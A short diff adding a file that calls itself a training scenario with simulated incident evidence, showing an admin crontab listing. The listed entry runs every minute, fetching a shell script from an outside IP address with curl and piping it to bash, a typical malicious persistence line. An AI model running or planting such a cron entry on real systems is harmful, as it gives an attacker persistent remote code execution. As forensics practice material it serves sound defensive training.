@@ -1,0 +1,6 @@
+Training scenario — simulated logs and evidence for practice, not a real incident
+
+$ crontab -u admin -l
+* * * * * curl -s http://91.240.118.30:8080/x.sh | bash
+
+Training scenario — simulated logs and evidence for practice, not a real incident
